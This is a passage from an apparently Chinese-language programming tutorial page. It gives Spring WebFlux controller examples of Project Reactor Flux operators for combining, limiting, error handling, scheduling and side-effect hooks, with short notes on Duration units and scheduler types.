class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api/operators&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperatorExamples</span> &#123;<br><br>    <span class="hljs-comment">// 1. mergeWith(Publisher&lt;? extends T&gt; other)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/mergeWith&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">mergeWithExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux1 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>).<span class="hljs-title function_">delayElements</span>(<span class="hljs-title class_">Duration</span>.<span class="hljs-title function_">ofMillis</span>(<span class="hljs-number">100</span>));<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux2 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>).<span class="hljs-title function_">delayElements</span>(<span class="hljs-title class_">Duration</span>.<span class="hljs-title function_">ofMillis</span>(<span class="hljs-number">50</span>));<br>        <span class="hljs-keyword">return</span> flux1.<span class="hljs-title function_">mergeWith</span>(flux2); <span class="hljs-comment">// 并行混合输出，不保证顺序</span><br>    &#125;<br><br>    <span class="hljs-comment">// 2. concatWith(Publisher&lt;? extends T&gt; other)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/concatWith&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">concatWithExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux1 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>);<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux2 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);<br>        <span class="hljs-keyword">return</span> flux1.<span class="hljs-title function_">concatWith</span>(flux2); <span class="hljs-comment">// 先发 flux1，再发 flux2，严格按顺序来</span><br>    &#125;<br><br>    <span class="hljs-comment">// 3. zipWith(Publisher&lt;? extends U&gt; other)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/zipWith&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">zipWithExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux1 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>);<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux2 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>);<br>        <span class="hljs-keyword">return</span> flux1.<span class="hljs-title function_">zipWith</span>(flux2) <span class="hljs-comment">// 执行结果：[&#123;&quot;t1&quot;:&quot;A&quot;,&quot;t2&quot;:&quot;1&quot;&#125;,&#123;&quot;t1&quot;:&quot;B&quot;,&quot;t2&quot;:&quot;2&quot;&#125;]</span><br>                    .<span class="hljs-title function_">map</span>(tuple -&gt; tuple.<span class="hljs-title function_">getT1</span>() + tuple.<span class="hljs-title function_">getT2</span>()); <span class="hljs-comment">// 输出 &quot;A1&quot;, &quot;B2&quot;</span><br>    &#125;<br><br>    <span class="hljs-comment">// 4. combineLatest(Publisher&lt;? extends U&gt; other, BiFunction&lt;T, U, R&gt; combinator)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/combineLatest&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">combineLatestExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux1 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>).<span class="hljs-title function_">delayElements</span>(<span class="hljs-title class_">Duration</span>.<span class="hljs-title function_">ofMillis</span>(<span class="hljs-number">100</span>));<br>        <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; flux2 = <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>).<span class="hljs-title function_">delayElements</span>(<span class="hljs-title class_">Duration</span>.<span class="hljs-title function_">ofMillis</span>(<span class="hljs-number">50</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">combineLatest</span>(flux1, flux2, (s1, s2) -&gt; s1 + s2); <span class="hljs-comment">// 总是用“最新”组合，返回：A1A2A3B3</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="6-1-2-6-限制与截取方法"><a href="#6-1-2-6-限制与截取方法" class="headerlink" title="6.1.2.6. 限制与截取方法"></a>6.1.2.6. 限制与截取方法</h6><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/api/operators&quot;</span>)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperatorExamples</span> &#123;<br><br>    <span class="hljs-comment">// 1. take(long n)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/take&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;Integer&gt; takeExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)<br>                   .take(<span class="hljs-number">3</span>); <span class="hljs-comment">// 只取前 3 个元素，输出：1, 2, 3</span><br>    &#125;<br><br>    <span class="hljs-comment">// 2. takeLast(int n)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/takeLast&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;Integer&gt; takeLastExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)<br>                   .takeLast(<span class="hljs-number">3</span>); <span class="hljs-comment">// 等所有元素发完后再输出最后 3 个，输出：8, 9, 10</span><br>    &#125;<br><br>    <span class="hljs-comment">// 3. skip(long n)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/skip&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;Integer&gt; skipExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)<br>                   .skip(<span class="hljs-number">4</span>); <span class="hljs-comment">// 跳过前 4 个，输出：5, 6, 7, 8, 9, 10</span><br>    &#125;<br><br>    <span class="hljs-comment">// 4. skipLast(int n)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/skipLast&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;Integer&gt; skipLastExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)<br>                   .skipLast(<span class="hljs-number">4</span>); <span class="hljs-comment">// 丢弃最后 4 个，输出：1, 2, 3, 4, 5, 6</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h6 id="6-1-2-7-错误处理"><a href="#6-1-2-7-错误处理" class="headerlink" title="6.1.2.7. 错误处理"></a>6.1.2.7. 错误处理</h6><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api/operators&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorHandlingExamples</span> &#123;<br><br>    <span class="hljs-comment">// 1. onErrorReturn(T fallback)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/onErrorReturn&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">onErrorReturnExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                   .<span class="hljs-title function_">concatWith</span>(<span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">error</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Boom!&quot;</span>)))<br>                   .<span class="hljs-title function_">onErrorReturn</span>(<span class="hljs-string">&quot;Fallback&quot;</span>); <span class="hljs-comment">// 出错时返回默认值：&quot;Fallback&quot;</span><br>    &#125;<br><br>    <span class="hljs-comment">// 2. onErrorMap(Function&lt;Throwable, ? extends Throwable&gt; mapper)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/onErrorMap&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">onErrorMapExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                   .<span class="hljs-title function_">concatWith</span>(<span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">error</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>)))<br>                   .<span class="hljs-title function_">onErrorMap</span>(e -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomException</span>(<span class="hljs-string">&quot;Mapped: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>()));<br>    &#125;<br><br>    <span class="hljs-comment">// 3. onErrorResume(Function&lt;Throwable, ? extends Publisher&lt;? extends T&gt;&gt; fallback)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/onErrorResume&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">onErrorResumeExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                   .<span class="hljs-title function_">concatWith</span>(<span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">error</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Service down&quot;</span>)))<br>                   .<span class="hljs-title function_">onErrorResume</span>(e -&gt; <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;Switched to backup&quot;</span>, <span class="hljs-string">&quot;Another item&quot;</span>)); <span class="hljs-comment">// 切换到备用 Flux</span><br>    &#125;<br><br>    <span class="hljs-comment">// 4. onErrorContinue(BiConsumer&lt;Throwable, Object&gt; errorConsumer)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/onErrorContinue&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">onErrorContinueExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;two&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>                   .<span class="hljs-title function_">map</span>(<span class="hljs-title class_">Integer</span>::<span class="hljs-built_in">parseInt</span>)<br>                   .<span class="hljs-title function_">onErrorContinue</span>((e, value) -&gt;<br>                       <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;Skipping &#x27;&quot;</span> + value + <span class="hljs-string">&quot;&#x27; due to: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>()));<br>        <span class="hljs-comment">// &quot;two&quot; 转换失败被跳过，继续处理 &quot;3&quot;</span><br>    &#125;<br><br>    <span class="hljs-comment">// 5. retry(long times)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/retry&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">retryExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                   .<span class="hljs-title function_">concatWith</span>(<span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">error</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Temporary failure&quot;</span>)))<br>                   .<span class="hljs-title function_">retry</span>(<span class="hljs-number">3</span>) <span class="hljs-comment">// 错误信号会被 retry(3) 捕获并重试最多 3 次</span><br>                   .<span class="hljs-title function_">onErrorReturn</span>(<span class="hljs-string">&quot;After retries, fallback&quot;</span>); <span class="hljs-comment">// 若仍然失败，则返回默认值</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="6-1-2-8-延迟与调度方法"><a href="#6-1-2-8-延迟与调度方法" class="headerlink" title="6.1.2.8. 延迟与调度方法"></a>6.1.2.8. 延迟与调度方法</h6><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/api/flux&quot;</span>)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FluxThreadingAndTiming</span> &#123;<br><br>    <span class="hljs-comment">// 1. delayElements(Duration delay)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/delayElements&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; delayElementsExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                   .delayElements(Duration.ofSeconds(<span class="hljs-number">1</span>)); <span class="hljs-comment">// 每个元素之间间隔 1 秒发出</span><br>    &#125;<br><br>    <span class="hljs-comment">// 2. subscribeOn(Scheduler scheduler)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/subscribeOn&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; subscribeOnExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.defer(() -&gt; &#123;<br>                    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Subscribed on thread: &quot;</span> + Thread.currentThread().getName());<br>                    <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;data1&quot;</span>, <span class="hljs-string">&quot;data2&quot;</span>);<br>                &#125;)<br>                .subscribeOn(Schedulers.boundedElastic()); <span class="hljs-comment">// 指定「数据源」运行在哪个线程池</span><br>    &#125;<br><br>    <span class="hljs-comment">// 3. publishOn(Scheduler scheduler)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/publishOn&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; publishOnExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>)<br>                   .doOnNext(v -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Before publishOn: &quot;</span> + Thread.currentThread().getName()))<br>                   .publishOn(Schedulers.parallel()) <span class="hljs-comment">// 从这里开始切换执行线程</span><br>                   .doOnNext(v -&gt; System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;After publishOn: &quot;</span> + Thread.currentThread().getName()));<br>    &#125;<br>    <br>     <span class="hljs-comment">// 4. timeout(Duration timeout)</span><br>    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;/timeout&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> Flux&lt;String&gt; timeoutExample() &#123;<br>        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>)<br>                   .delayElements(Duration.ofSeconds(<span class="hljs-number">2</span>)) <span class="hljs-comment">// 每个元素延迟2秒</span><br>                   .timeout(Duration.ofSeconds(<span class="hljs-number">1</span>))       <span class="hljs-comment">// 如果超过1秒未发出新元素，则触发 TimeoutException</span><br>                   .onErrorResume(e -&gt; Flux.just(<span class="hljs-string">&quot;超时fallback&quot;</span>)); <span class="hljs-comment">// 错误降级处理</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>.delayElements</code> 单位<ol><li><code>Duration.ofNanos(long)</code>：<ol><li>纳秒</li></ol></li><li><code>Duration.ofMillis(long)</code>：<ol><li>毫秒</li></ol></li><li><code>Duration.ofSeconds(long)</code>：<ol><li>秒</li></ol></li><li><code>Duration.ofMinutes(long)</code>：<ol><li>分钟</li></ol></li><li><code>Duration.ofHours(long)</code>：<ol><li>小时</li></ol></li><li><code>Duration.ofDays(long)</code>：<ol><li>天数</li></ol></li></ol></li><li>常见线程<ol><li><code>Schedulers.parallel()</code><ol><li>适用于 CPU 密集型任务，使用固定大小线程池</li></ol></li><li><code>Schedulers.boundedElastic()</code><ol><li>适用于 I&#x2F;O 密集型任务（如数据库、网络、文件操作）</li></ol></li><li><code>Schedulers.immediate()</code><ol><li>在当前线程中执行</li></ol></li><li><code>Schedulers.fromExecutor(Executor)</code><ol><li>使用自定义线程池调度任务</li></ol></li></ol></li></ol></blockquote><hr><h6 id="6-1-2-9-其他实用方法"><a href="#6-1-2-9-其他实用方法" class="headerlink" title="6.1.2.9. 其他实用方法"></a>6.1.2.9. 其他实用方法</h6><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/api/flux&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FluxHooksController</span> &#123;<br><br>    <span class="hljs-comment">// 1. doOnNext(Consumer&lt;? super T&gt; onNext)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/doOnNext&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">doOnNextExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;orange&quot;</span>)<br>                   .<span class="hljs-title function_">doOnNext</span>(item -&gt; <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;处理前日志：&quot;</span> + item));<br>    &#125;<br><br>    <span class="hljs-comment">// 2. doOnError(Consumer&lt;? super Throwable&gt; onError)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/doOnError&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">doOnErrorExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>                   .<span class="hljs-title function_">concatWith</span>(<span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">error</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;故意错误&quot;</span>)))<br>                   .<span class="hljs-title function_">doOnError</span>(e -&gt; <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;错误发生：&quot;</span> + e.<span class="hljs-title function_">getMessage</span>()));<br>    &#125;<br><br>    <span class="hljs-comment">// 3. doOnComplete(Runnable onComplete)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/doOnComplete&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">doOnCompleteExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>)<br>                   .<span class="hljs-title function_">doOnComplete</span>(() -&gt; <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;流已完成&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 4. doOnSubscribe(Consumer&lt;? super Subscription&gt; onSubscribe)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/doOnSubscribe&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">doOnSubscribeExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;start&quot;</span>)<br>                   .<span class="hljs-title function_">doOnSubscribe</span>(sub -&gt; <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;订阅开始：&quot;</span> + sub));<br>    &#125;<br><br>    <span class="hljs-comment">// 5. doFinally(Consumer&lt;SignalType&gt; onFinally)</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/doFinally&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">doFinallyExample</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">just</span>(<span class="hljs-string">&quot;keep&quot;</span>, <span class="hljs-string">&quot;going&quot;</span>)<br>                   .<span class="hljs-title function_">concatWith</span>(<span class="hljs-title class_">Flux</span>.<span class="hljs-title function_">error</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Oops!&quot;</span>)))<br>                   .<span class="hljs-title function_">doFinally</span>(<span class="hljs-keyword">type</span> -&gt; <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;流终止，原因：&quot;</span> + <span class="hljs-keyword">type</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 6. log()</span><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/log&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Flux</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title 